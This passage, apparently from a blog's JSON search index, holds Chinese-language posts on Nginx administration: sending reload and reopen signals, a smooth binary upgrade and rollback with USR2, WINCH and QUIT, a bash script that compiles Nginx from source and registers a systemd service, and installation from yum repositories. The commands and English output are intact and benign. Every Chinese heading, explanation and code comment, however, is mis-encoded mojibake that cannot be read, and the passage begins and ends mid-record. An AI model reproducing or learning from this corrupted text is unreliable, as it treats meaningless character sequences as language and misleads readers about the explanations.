-I #NginxæœåŠ¡å™¨åœ°å€ 172.16.16.88 reload ä¿¡å· reloadä¿¡å·è¿è¡Œæµç¨‹\nåˆ©ç”¨ reload å¯ä»¥å®ç°å¹³æ»‘ä¿®æ”¹é…ç½®å¹¶ç”Ÿæ•ˆ\nå‘masterè¿›ç¨‹å‘é€HUPä¿¡å·(reloadå‘½ä»¤) masterè¿›ç¨‹æ ¡éªŒé…ç½®è¯­æ³•æ˜¯å¦æ­£ç¡® masterè¿›ç¨‹æ‰“å¼€æ–°çš„ç›‘å¬ç«¯å£ masterè¿›ç¨‹ç”¨æ–°çš„é…ç½®å¯åŠ¨æ–°çš„workerå­è¿›ç¨‹ masterè¿›ç¨‹å‘è€workerå­è¿›ç¨‹å‘é€QUITä¿¡å·é€šçŸ¥æ—§çš„workerå¤„ç†å®Œå½“å‰è¿æ¥åé€€å‡ºï¼Œç©ºé—²workeræ—§è¿›ç¨‹ä¸å†å¤„ç†æ–°æ¥çš„è¯·æ±‚ æ—§workerè¿›ç¨‹å…³é—­ç›‘å¬å¥æŸ„ï¼Œå¤„ç†å®Œå½“å‰è¿æ¥åç»“æŸè¿›ç¨‹ èŒƒä¾‹ï¼šæƒ³nginxå‘é€reloadä¿¡å·å®ç°ä¸åœæœºæ›´æ–°é…ç½®\n[root@centos7 ~]# nginx #å¯åŠ¨nginx [root@centos7 ~]# ps -ef|grep nginx #å½“å‰æœ‰ä¸€ä¸ªmasterè¿›ç¨‹å’Œä¸€ä¸ªworkerè¿›ç¨‹ root 20091 1 0 17:51 ? 00:00:00 nginx: master process nginx nginx 20092 20091 0 17:51 ? 00:00:00 nginx: worker process root 20094 19981 0 17:51 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# cat /apps/nginx/conf/nginx.conf | grep processes #å½“å‰é…ç½®nginxçš„workerè¿›ç¨‹æ•°ä¸º1 worker_processes 1; [root@centos7 ~]# sed -i \u0026#39;/worker_processes/c\\worker_processes 3;\u0026#39; /apps/nginx/conf/nginx.conf #å°†worker_processes çš„å€¼æ”¹ä¸º3 [root@centos7 ~]# grep worker_processes /apps/nginx/conf/nginx.conf worker_processes 3; [root@centos7 ~]# nginx -t \u0026amp;\u0026amp; nginx -s reload #æ£€æŸ¥é…ç½®å¹¶å‘é€reloadä¿¡å· nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 ~]# ps -ef | grep nginx #nginxçš„workerè¿›ç¨‹æ•°é‡ä¸º3 root 20091 1 0 17:51 ? 00:00:00 nginx: master process nginx nginx 20158 20091 0 18:05 ? 00:00:00 nginx: worker process nginx 20159 20091 0 18:05 ? 00:00:00 nginx: worker process nginx 20160 20091 0 18:05 ? 00:00:00 nginx: worker process root 20162 19981 0 18:05 pts/1 00:00:00 grep --color=auto nginx reopenä¿¡å· reopen ä¿¡å·é‡å†™æ—¥å¿—æ–‡ä»¶\n1ã€nginx å½“å‰å°†æ—¥å¿—è®°å½•åœ¨access.logæ–‡ä»¶\n2ã€å°†access.log é‡å‘½åä¸ºaccess.log.oldï¼Œæ—¥å¿—ä»è®°å½•åˆ°access.log.oldæ–‡ä»¶ä¸­ï¼ˆå› ä¸ºNginxå·²æŒæœ‰æ­¤æ–‡ä»¶çš„æè¿°ç¬¦ï¼‰\n3ã€æ–°å»ºaccess.logæ–‡ä»¶ï¼Œå‘nginxå‘é€reopenä¿¡å·ï¼Œä½¿å¾—æ–°çš„æ—¥å¿—è®°å½•åœ¨æ–°ç”Ÿæˆçš„æ–‡ä»¶ä¸­ï¼ˆç”¨äºå®ç°æ—¥å¿—è½®è½¬ï¼‰\nNginx å¹³æ»‘å‡çº§å’Œå›æ»š å·¥ä½œä¸­æœ‰æ—¶å€™éœ€è¦å¯¹Nginxç‰ˆæœ¬è¿›è¡Œå‡çº§ä»¥æ»¡è¶³å¯¹å…¶åŠŸèƒ½çš„éœ€æ±‚ï¼Œä¾‹å¦‚æ·»åŠ æ–°æ¨¡å—ï¼Œéœ€è¦æ–°åŠŸèƒ½ï¼Œè€Œæ­¤æ—¶\nNginxåˆåœ¨è¿è¡Œç€é‡è¦ä¸šåŠ¡ä¸èƒ½ç›´æ¥åœæ‰ã€‚åœ¨æ­¤èƒŒæ™¯ä¸‹å¯é€‰æ‹©å¹³æ»‘å‡çº§nginx\nå¹³æ»‘å‡çº§æµç¨‹ å¹³æ»‘å‡çº§æµç¨‹\nå°†æ—§NginxäºŒè¿›åˆ¶æ–‡ä»¶æ¢æˆæ–°Nginxç¨‹åºæ–‡ä»¶ï¼ˆæ³¨æ„å…ˆå¤‡ä»½) å‘masterè¿›ç¨‹å‘é€USR2ä¿¡å·ï¼Œmasterè¿›ç¨‹è‡ªåŠ¨ä¿®æ”¹pidæ–‡ä»¶ååŠ ä¸Šåç¼€.oldbin,æˆä¸ºnginx.pid.oldbin masterè¿›ç¨‹ç”¨æ–°Nginxæ–‡ä»¶å¯åŠ¨æ–°masterè¿›ç¨‹æˆä¸ºæ—§masterçš„å­è¿›ç¨‹,ç³»ç»Ÿä¸­å°†æœ‰æ–°æ—§ä¸¤ä¸ªNginxä¸»è¿›ç¨‹ï¼Œæ–°ç”Ÿæˆçš„masterè¿›ç¨‹çš„PIDå­˜æ”¾è‡³æ–°ç”Ÿæˆçš„pidæ–‡ä»¶nginx.pid ä¸»è¿›ç¨‹å…±åŒæä¾›WebæœåŠ¡,å½“å‰æ–°çš„è¯·æ±‚ä»ç„¶ç”±æ—§Nginxçš„workerè¿›ç¨‹è¿›è¡Œå¤„ç† å‘æ—§çš„NginxæœåŠ¡è¿›ç¨‹å‘é€WINCHä¿¡å·ï¼Œä½¿æ—§çš„Nginx workerè¿›ç¨‹å¹³æ»‘åœæ­¢ å‘æ—§masterè¿›ç¨‹å‘é€QUITä¿¡å·ï¼Œå…³é—­è€masterï¼Œè¿›ç¨‹è‡ªåŠ¨åˆ é™¤Nginx.pid.oldbinæ–‡ä»¶ å¦‚æœå‘ç°å‡çº§æœ‰é—®é¢˜,å¯ä»¥å›æ»šâˆ¶å‘è€masterå‘é€HUPï¼Œå‘æ–°masterå‘é€QUIT å¹³æ»‘å‡çº§å’Œå›æ»šæ¡ˆä¾‹ #å½“å‰nginxç‰ˆæœ¬åŠå®‰è£…è·¯å¾„ [root@centos7 nginx]# nginx -v nginx version: nginx/1.18.0 [root@centos7 nginx]# which nginx /apps/nginx/sbin/nginx #è·å–è€ç‰ˆæœ¬ç¼–è¯‘å‚æ•° --prefix [root@centos7 ~]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module #ä¸‹è½½ä¸€ä¸ªè¾ƒæ–°ç‰ˆæœ¬ï¼Œä½¿ç”¨ä¸Šä¸€æ­¥è·å¾—çš„ç¼–è¯‘å‚æ•°è¿›è¡Œç¼–è¯‘ [root@centos7 ~]# wget http://nginx.org/download/nginx-1.20.1.tar.gz [root@centos7 ~]# tar xf nginx-1.20.1.tar.gz [root@centos7 ~]# cd nginx-1.20.1/ [root@centos7 nginx-1.20.1]# ./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 nginx-1.20.1]# make #ä¸éœ€è¦æ‰§è¡Œmake install [root@centos7 nginx-1.20.1]# objs/nginx -v #æŸ¥çœ‹ç¼–è¯‘ç»“æœ nginx version: nginx/1.20.1 #å¤‡ä»½æ—§ç‰ˆnginxç¨‹åºï¼ˆç”¨äºå›æ»šï¼‰ [root@centos7 ~]# mv /apps/nginx/sbin/{nginx,nginx.old} #å°†ç¼–è¯‘åçš„æ–°ç‰ˆnginxæ‹·è´åˆ°æ—§ç‰ˆå®‰è£…è·¯å¾„ä¸‹ [root@centos7 ~]# cp ./nginx-1.20.1/objs/nginx /apps/nginx/sbin/ [root@centos7 ~]# ll /apps/nginx/sbin/ total 15308 -rwxr-xr-x 1 root root 7893488 Jul 21 18:49 nginx -rwxr-xr-x 1 root root 7774224 Jul 21 00:17 nginx.old #éªŒè¯æ›¿æ¢ç»“æœ [root@centos7 ~]# /apps/nginx/sbin/nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 ~]# /apps/nginx/sbin/nginx -v nginx version: nginx/1.20.1 #nginx é»˜è®¤å°†pidæ–‡ä»¶å­˜æ”¾äº/app/nginx/logs/è·¯å¾„ä¸‹ [root@centos7 ~]# grep pid /apps/nginx/conf/nginx.conf #pid logs/nginx.pid; [root@centos7 ~]# ll /apps/nginx/logs/nginx.pid -rw-r--r-- 1 root root 6 Jul 21 19:01 /apps/nginx/logs/nginx.pid #æŸ¥çœ‹å½“å‰nginxè¿›ç¨‹ [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx nginx 23504 23503 0 19:06 ? 00:00:00 nginx: worker process root 23545 23521 0 19:07 pts/1 00:00:00 grep --color=auto nginx #å‘æ—§ç‰ˆnginxå‘é€USR2ä¿¡å· [root@centos7 ~]# kill -USR2 `cat /apps/nginx/logs/nginx.pid` #æ­¤æ—¶æœ‰ä¸¤ä¸ªmasterè¿›ç¨‹å…±å­˜ï¼Œå…¶ä¸­ä¸€ä¸ªmasteræ˜¯æ–°ç‰ˆnginxç”Ÿæˆçš„ã€‚ç”±æ–°ç‰ˆnginxè´Ÿè´£ç›‘å¬å¤„ç†æ–°çš„è¯·æ±‚ï¼Œæ—§ç‰ˆnginxä¸å†å¤„ç†ã€‚ [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx nginx 23504 23503 0 19:06 ? 00:00:00 nginx: worker process root 23547 23503 0 19:07 ? 00:00:00 nginx: master process nginx nginx 23548 23547 0 19:07 ? 00:00:00 nginx: worker process root 23550 23521 0 19:07 pts/1 00:00:00 grep --color=auto nginx #æ–°ç‰ˆæœ¬masterè¿›ç¨‹æ˜¯æ—§ç‰ˆnginxè¿›ç¨‹çš„å­è¿›ç¨‹ [root@centos7 ~]# pstree -p| grep nginx |-nginx(23503)-+-nginx(23547)---nginx(23548) | `-nginx(23504) #æŸ¥çœ‹ç«¯å£ç›‘å¬æƒ…å†µï¼Œä¸¤ä¸ªç‰ˆæœ¬éƒ½åœ¨ç›‘å¬80ç«¯å£ï¼Œä½†å®é™…çš„è¯·æ±‚æ˜¯ç”±æ—§ç‰ˆnginxçš„workerè¿›ç¨‹å¤„ç† [root@centos7 ~]# lsof -i :80 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME nginx 23503 root 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23504 nginx 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23547 root 6u IPv4 191644 0t0 TCP *:http (LISTEN) nginx 23548 nginx 6u IPv4 191644 0t0 TCP *:http (LISTEN) #pidæ–‡ä»¶ä¹Ÿç”Ÿæˆäº†æ–°æ—§ä¸¤ä¸ªç‰ˆæœ¬ [root@centos7 ~]# ll /apps/nginx/logs/ total 20 -rw-r--r-- 1 nginx root 172 Jul 21 18:48 access.log -rw-r--r-- 1 root root 258 Jul 21 18:19 access.log.old -rw-r--r-- 1 nginx root 1879 Jul 21 19:07 error.log -rw-r--r-- 1 root root 6 Jul 21 19:07 nginx.pid -rw-r--r-- 1 root root 6 Jul 21 19:06 nginx.pid.oldbin ã€‚ #å‘æ—§ç‰ˆnginxä¸»è¿›ç¨‹å‘é€WINCHä¿¡å·ï¼Œå®ƒä¼šé€æ­¥å…³é—­æ‰€æœ‰workerè¿›ç¨‹ï¼ˆä¸»è¿›ç¨‹ä¸é€€å‡ºï¼Œæ–¹ä¾¿å›æ»šï¼‰ï¼Œè€Œåæ‰€æœ‰è¯·æ±‚å°†ç”±æ–°ç‰ˆnginxå¤„ç† [root@centos7 ~]# kill -WINCH `cat /apps/nginx/logs/nginx.pid.oldbin` [root@centos7 ~]# pstree -p| grep nginx |-nginx(23503)---nginx(23547)---nginx(23548) [root@centos7 ~]# ps -ef | grep nginx root 23503 1 0 19:06 ? 00:00:00 nginx: master process nginx root 23547 23503 0 19:07 ? 00:00:00 nginx: master process nginx nginx 23548 23547 0 19:07 ? 00:00:00 nginx: worker process root 23598 23521 0 19:22 pts/1 00:00:00 grep --color=auto nginx #å¦‚æœæ­¤æ—¶æ–°ç‰ˆæœ¬å‡ºç°é—®é¢˜ï¼Œå¯æ‰§è¡Œå›æ»šæ“ä½œ ####################å›æ»š###################### #å‘æ—§ç‰ˆnginxå‘é€HUPä¿¡å·ï¼Œé‡æ–°ç”Ÿæˆworkè¿›ç¨‹å¤„ç†æ–°çš„è¯·æ±‚ [root@centos7 ~]# kill -HUP `cat /apps/nginx/logs/nginx.pid.oldbin` #å…³é—­æ–°ç‰ˆnginxè¿›ç¨‹ [root@centos7 ~]# kill -QUIT `cat /apps/nginx/logs/nginx.pid` #####################å›æ»š#################### #ç»è¿‡ä¸€æ®µæ—¶é—´åï¼Œå¦‚æœæ–°ç‰ˆnginxæ­£å¸¸è¿è¡Œï¼Œå°±å¯ä»¥å…³é—­æ—§ç‰ˆnginxä¸»è¿›ç¨‹master [root@centos7 ~]# kill -QUIT `cat /apps/nginx/logs/nginx.pid.oldbin` [root@centos7 ~]# ps -ef | grep nginx root 23547 1 0 19:07 ? 00:00:00 nginx: master process nginx nginx 23548 23547 0 19:07 ? 00:00:00 nginx: worker process root 23603 23521 0 19:27 pts/1 00:00:00 grep --color=auto nginx #ç‰ˆæœ¬å‡çº§æˆåŠŸ [root@centos7 ~]# nginx -v nginx version: nginx/1.20.1 [root@centos7 ~]# curl localhost \u0026amp;\u0026gt; /dev/null \u0026amp;\u0026amp; echo $? 0 ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7/","summary":"\u003cp\u003eåˆ©ç”¨Nginxä¿¡å·å®ç°å¹³æ»‘å‡çº§\u003c/p\u003e","title":"Nginxå¹³æ»‘å‡çº§å’Œå›æ»š"},{"content":"ä½¿ç”¨æºç åŒ…ä¸€é”®å®‰è£…Nginx\n#!/bin/bash #è¯¥è„šæœ¬é€‚ç”¨äºcentoså’Œubuntuæ“ä½œç³»ç»Ÿ #Nginxå®‰è£…æˆåŠŸåé»˜è®¤é…ç½®å¼€æœºè‡ªå¯ ###########è‡ªå®šä¹‰å‚æ•°############# SRC_DIR=/usr/local/src #å®‰è£…è·¯å¾„ NGINX_INSTALL_DIR=/apps/nginx #è½¯ä»¶ç‰ˆæœ¬ï¼Œå¯æå‰å°†è½¯ä»¶åŒ…æ‹·è´åˆ°/usr/local/srcç›®å½•ä¸‹ NGINX_FILE=nginx-1.18.0 TAR=.tar.gz #ä¸‹è½½è·¯å¾„ NGINX_URL=http://nginx.org/download/ #################################### #è·å–cpuæ ¸å¿ƒæ•° CPUS=`lscpu |awk \u0026#39;/^CPU\\(s\\)/{print $2}\u0026#39;` #æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°ï¼Œè‡ªå®šä¹‰è¾“å‡ºé¢œè‰²å’Œæ‰“å°å®½åº¦ color () { RES_COL=60 MOVE_TO_COL=\u0026#34;echo -en \\E[${RES_COL}G\u0026#34; SETCOLOR_SUCCESS=\u0026#34;echo -en \\E[1;32m\u0026#34; SETCOLOR_FAILURE=\u0026#34;echo -en \\E[1;31m\u0026#34; SETCOLOR_WARNING=\u0026#34;echo -en \\E[1;33m\u0026#34; SETCOLOR_NORMAL=\u0026#34;echo -en \\E[0m\u0026#34; echo -n \u0026#34;$1\u0026#34; \u0026amp;\u0026amp; $MOVE_TO_COL echo -n \u0026#34;[\u0026#34; if [ $2 = \u0026#34;success\u0026#34; -o $2 = \u0026#34;0\u0026#34; ] ;then ${SETCOLOR_SUCCESS} echo -n $\u0026#34; OK \u0026#34; elif [ $2 = \u0026#34;failure\u0026#34; -o $2 = \u0026#34;1\u0026#34; ] ;then ${SETCOLOR_FAILURE} echo -n $\u0026#34;FAILED\u0026#34; else ${SETCOLOR_WARNING} echo -n $\u0026#34;WARNING\u0026#34; fi ${SETCOLOR_NORMAL} echo -n \u0026#34;]\u0026#34; echo } #æ“ä½œç³»ç»Ÿç±»å‹ï¼šCentOS/Ubuntu os_type () { awk -F\u0026#39;[ \u0026#34;]\u0026#39; \u0026#39;/^NAME/{print $2}\u0026#39; /etc/os-release } #æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼š6/7/8 os_version () { awk -F\u0026#39;\u0026#34;\u0026#39; \u0026#39;/^VERSION_ID/{print $2}\u0026#39; /etc/os-release } #æ£€æŸ¥nginxæ˜¯å¦å·²å®‰è£…ä»¥åŠæ˜¯å¦éœ€è¦ä¸‹è½½æºç åŒ… check () { [ -e ${NGINX_INSTALL_DIR} ] \u0026amp;\u0026amp; { color \u0026#34;nginx å·²å®‰è£…,è¯·å¸è½½åå†å®‰è£…\u0026#34; 1; exit; } cd ${SRC_DIR} if [ -e ${NGINX_FILE}${TAR} ];then color \u0026#34;ç›¸å…³æ–‡ä»¶å·²å‡†å¤‡å¥½\u0026#34; 0 else color \u0026#39;å¼€å§‹ä¸‹è½½ nginx æºç åŒ…\u0026#39; 0 wget ${NGINX_URL}${NGINX_FILE}${TAR} [ $? -ne 0 ] \u0026amp;\u0026amp; { color \u0026#34;ä¸‹è½½ ${NGINX_FILE}${TAR}æ–‡ä»¶å¤±è´¥\u0026#34; 1; exit; } fi } #å®‰è£…nginx install () { color \u0026#34;å¼€å§‹å®‰è£… nginx\u0026#34; 0 if id nginx \u0026amp;\u0026gt; /dev/null;then color \u0026#34;nginx ç”¨æˆ·å·²å­˜åœ¨\u0026#34; 3 else useradd -s /sbin/nologin -r nginx color \u0026#34;åˆ›å»º nginx ç”¨æˆ·\u0026#34; 0 fi color \u0026#34;å¼€å§‹å®‰è£… nginx ä¾èµ–åŒ…\u0026#34; 0 if [ `os_type` == \u0026#34;CentOS\u0026#34; -a `os_version` == \u0026#39;8\u0026#39; ] ;then yum -y -q install make gcc-c++ libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel perl-ExtUtils-Embed elif [ `os_type` == \u0026#34;CentOS\u0026#34; -a `os_version` == \u0026#39;7\u0026#39; ];then yum -y -q install make gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed else apt update \u0026amp;\u0026gt; /dev/null apt -y install make gcc libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev \u0026amp;\u0026gt; /dev/null fi cd $SRC_DIR tar xf ${NGINX_FILE}${TAR} NGINX_DIR=`echo ${NGINX_FILE}${TAR}| sed -nr \u0026#39;s/^(.*[0-9]).*/\\1/p\u0026#39;` cd ${NGINX_DIR} ./configure --prefix=${NGINX_INSTALL_DIR} --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module make -j $CPUS \u0026amp;\u0026amp; make install [ $? -eq 0 ] \u0026amp;\u0026amp; chown -R nginx.nginx ${NGINX_INSTALL_DIR} \u0026amp;\u0026amp; color \u0026#34;nginx ç¼–è¯‘å®‰è£…æˆåŠŸ\u0026#34; 0 || { color \u0026#34;nginx ç¼–è¯‘å®‰è£…å¤±è´¥,é€€å‡º!\u0026#34; 1 ;exit; } echo \u0026#34;PATH=${NGINX_INSTALL_DIR}/sbin:${PATH}\u0026#34; \u0026gt; /etc/profile.d/nginx.sh . /etc/profile.d/nginx.sh cat \u0026gt; /lib/systemd/system/nginx.service \u0026lt;\u0026lt;EOF [Unit] Description=The nginx HTTP and reverse proxy server After=network.target remote-fs.target nss-lookup.target [Service] Type=forking PIDFile=${NGINX_INSTALL_DIR}/logs/nginx.pid ExecStartPre=/bin/rm -f ${NGINX_INSTALL_DIR}/logs/nginx.pid ExecStartPre=${NGINX_INSTALL_DIR}/sbin/nginx -t ExecStart=${NGINX_INSTALL_DIR}/sbin/nginx ExecReload=/bin/kill -s HUP \\$MAINPID KillSignal=SIGQUIT TimeoutStopSec=5 KillMode=process PrivateTmp=true [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl enable --now nginx \u0026amp;\u0026gt; /dev/null systemctl is-active nginx \u0026amp;\u0026gt; /dev/null || { color \u0026#34;nginx å¯åŠ¨å¤±è´¥,é€€å‡º!\u0026#34; 1 ; exit; } color \u0026#34;nginx å®‰è£…å®Œæˆ\u0026#34; 0 } check install ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/","summary":"\u003cp\u003eä½¿ç”¨æºç åŒ…ä¸€é”®å®‰è£…Nginx\u003c/p\u003e","title":"Nginxå®‰è£…è„šæœ¬"},{"content":"ç¼–è¯‘å®‰è£…nginxå’Œyumå®‰è£…Nginx\nNginx å®‰è£… Nginxç‰ˆæœ¬å’Œå®‰è£…æ–¹å¼ Nginxç‰ˆæœ¬\nMainline version ä¸»è¦å¼€å‘ç‰ˆæœ¬,ä¸€èˆ¬ä¸ºå¥‡æ•°ç‰ˆæœ¬å·,æ¯”å¦‚1.19 Stable version å½“å‰æœ€æ–°ç¨³å®šç‰ˆ,ä¸€èˆ¬ä¸ºå¶æ•°ç‰ˆæœ¬,å¦‚:1.20 Legacy versions æ—§çš„ç¨³å®šç‰ˆ,ä¸€èˆ¬ä¸ºå¶æ•°ç‰ˆæœ¬,å¦‚:1.18 Nginxå®‰è£…å¯ä»¥ä½¿ç”¨yumæˆ–æºç å®‰è£…ï¼Œä½†æ˜¯æ¨èä½¿ç”¨æºç ç¼–è¯‘å®‰è£…ï¼ŒåŸå› å¦‚ä¸‹ï¼š\nyumçš„ç‰ˆæœ¬æ¯”è¾ƒæ—§ ç¼–è¯‘å®‰è£…å¯ä»¥æ›´æ–¹ä¾¿è‡ªå®šä¹‰ç›¸å…³è·¯å¾„ ä½¿ç”¨æºç ç¼–è¯‘å¯ä»¥è‡ªå®šä¹‰ç›¸å…³åŠŸèƒ½ï¼Œæ›´æ–¹ä¾¿ä¸šåŠ¡çš„ä¸Šçš„ä½¿ç”¨ æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­çš„nginxç‰ˆæœ¬ èŒƒä¾‹ï¼šæŸ¥çœ‹ç³»ç»Ÿé•œåƒæºå’Œepelæºçš„nginxç‰ˆæœ¬\n# centos7 å·²å°†nginxé›†æˆåœ¨ç³»ç»Ÿé•œåƒæº [root@centos7 ~]#dnf info nginx Last metadata expiration check: 0:53:10 ago on Tue 22 Sep 2020 11:01:33 AM CST. Available Packages Name : nginx Epoch : 1 Version : 1.14.1 #ç‰ˆæœ¬è¾ƒè€ Release : 9.module_el8.0.0+184+e34fea82 Architecture : x86_64 Size : 570 k Source : nginx-1.14.1-9.module_el8.0.0+184+e34fea82.src.rpm Repository : AppStream #ç³»ç»Ÿé•œåƒæº Summary : A high performance web server and reverse proxy server URL : http://nginx.org/ License : BSD Description : Nginx is a web server and a reverse proxy server for HTTP, SMTP, POP3 and : IMAP protocols, with a strong focus on high concurrency, performance and low : memory usage. yum å®‰è£…nginx #CentOS7 éœ€æå‰é…ç½®epelæº # yum install -y epel-release [root@centos7 ~]# yum info nginx Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: mirrors.bfsu.edu.cn * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages Name : nginx Arch : x86_64 Epoch : 1 Version : 1.20.1\t#ç‰ˆæœ¬è¾ƒæ–° Release : 9.el7 Size : 587 k Repo : epel/x86_64\t#epelæº Summary : A high performance web server and reverse proxy server URL : https://nginx.org License : BSD Description : Nginx is a web server and a reverse proxy server for HTTP, SMTP, POP3 and : IMAP protocols, with a strong focus on high concurrency, performance and low : memory usage. å®˜æ–¹åŒ…ä¸‹è½½åœ°å€ï¼š http://nginx.org/en/linux_packages.html\nå®˜æ–¹yumæºï¼šhttp://nginx.org/en/linux_packages.html#RHEL-CentOS\nèŒƒä¾‹ï¼šé€šè¿‡å®˜æ–¹yumæºå®‰è£…nginx\n#é…ç½®yumæº [root@centos7 ~]# cat \u0026gt; /etc/yum.repos.d/nginx.repo \u0026lt;\u0026lt;EOF [nginx-stable] name=nginx stable repo baseurl=http://nginx.org/packages/centos/\\$releasever/\\$basearch/ gpgcheck=1 enabled=1 gpgkey=https://nginx.org/keys/nginx_signing.key module_hotfixes=true [nginx-mainline] name=nginx mainline repo baseurl=http://nginx.org/packages/mainline/centos/\\$releasever/\\$basearch/ gpgcheck=1 enabled=0 gpgkey=https://nginx.org/keys/nginx_signing.key module_hotfixes=true EOF #æŸ¥çœ‹æ‰€æœ‰nginxç‰ˆæœ¬ [root@centos7 ~]# yum list nginx --showduplicates Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: hkg.mirror.rackspace.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages nginx.x86_64 1:1.16.1-1.el7.ngx nginx-stable nginx.x86_64 1:1.18.0-1.el7.ngx nginx-stable nginx.x86_64 1:1.18.0-2.el7.ngx nginx-stable nginx.x86_64 1:1.20.0-1.el7.ngx nginx-stable nginx.x86_64 1:1.20.1-1.el7.ngx nginx-stable nginx.x86_64 1:1.20.1-9.el7 epel nginx.x86_64 1:1.20.2-1.el7.ngx nginx-stable nginx.x86_64 1:1.22.0-1.el7.ngx nginx-stable #æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼ˆé»˜è®¤æŸ¥çœ‹æœ€æ–°ç‰ˆæœ¬ï¼‰ [root@centos7 ~]# yum info nginx Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * epel: hkg.mirror.rackspace.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com Available Packages Name : nginx Arch : x86_64 Epoch : 1 Version : 1.22.0 Release : 1.el7.ngx Size : 796 k Repo : nginx-stable Summary : High performance web server URL : https://nginx.org/ License : 2-clause BSD-like license Description : nginx [engine x] is an HTTP and reverse proxy server, as well as : a mail proxy server. #å®‰è£…nginx [root@centos7 ~]# yum install -y nginx æ£€æŸ¥å®‰è£…ç»“æœ [root@centos7 ~]# rpm -q nginx nginx-1.22.0-1.el7.ngx.x86_64 #æŸ¥çœ‹æ—¥å¿—è½®è½¬é…ç½®æ–‡ä»¶è·¯å¾„ [root@centos7 ~]# rpm -ql nginx |grep log /etc/logrotate.d/nginx /var/log/nginx #é»˜è®¤å·²é…ç½®æ—¥å¿—è½®è½¬åŠŸèƒ½ [root@centos7 ~]# cat /etc/logrotate.d/nginx /var/log/nginx/*.log { daily missingok rotate 52 compress delaycompress notifempty create 640 nginx adm sharedscripts postrotate if [ -f /var/run/nginx.pid ]; then kill -USR1 `cat /var/run/nginx.pid` fi endscript } æŸ¥çœ‹nginxä½¿ç”¨å¸®åŠ© [root@centos7 ~]# nginx -h nginx version: nginx/1.22.0 Usage: nginx [-?hvVtTq] [-s signal] [-p prefix] [-e filename] [-c filename] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit #æ˜¾ç¤ºè¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯å’Œç¼–è¯‘å‚æ•° -t : test configuration and exit #æ£€æµ‹é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰è¯­æ³•é”™è¯¯ -T : test configuration, dump it and exit #æ£€æµ‹é…ç½®æ–‡ä»¶è¯­æ³•å¹¶æ‰“å°ç»“æœ -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload #å‘nginxå‘é€ç›¸å…³ä¿¡å· -p prefix : set prefix path (default: /etc/nginx/) -e filename : set error log file (default: /var/log/nginx/error.log) -c filename : set configuration file (default: /etc/nginx/nginx.conf) -g directives : set global directives out of configuration file#è®¾ç½®å…¨å±€æŒ‡ä»¤,æ³¨æ„å’Œé…ç½®æ–‡ä»¶ä¸è¦åŒæ—¶é…ç½®,å¦åˆ™å†²çª èŒƒä¾‹ï¼šnginxå‘½ä»¤çš„ä½¿ç”¨\n[root@centos7 ~]# nginx -g \u0026#34;worker_processes 6;\u0026#34; # å¯åŠ¨å¹¶é…ç½®nginxè¿›ç¨‹æ•°ï¼Œä¸é…ç½®æ–‡ä»¶å†²çª nginx: [emerg] \u0026#34;worker_processes\u0026#34; directive is duplicate in /etc/nginx/nginx.conf:3 [root@centos7 ~]# cat /etc/nginx/nginx.conf |grep processes #é…ç½®æ–‡ä»¶ä¸­å·²æœ‰é…ç½®é¡¹ worker_processes auto; [root@centos7 ~]# cat /etc/nginx/nginx.conf |grep processes #æ³¨é‡Šæ­¤é…ç½®é¡¹ #worker_processes auto; [root@centos7 ~]# nginx -g \u0026#34;worker_processes 6;\u0026#34; #å¯åŠ¨nginxï¼Œå¼€å¯6ä¸ªworkerè¿›ç¨‹ã€‚é»˜è®¤åå°æ‰§è¡Œ [root@centos7 ~]# ps aux | grep nginx #éªŒè¯ç»“æœ root 2233 0.0 0.1 49056 1156 ? Ss 17:23 0:00 nginx: master process nginx -g worker_processes 6; nginx 2234 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2235 0.0 0.1 49444 1896 ? S 17:23 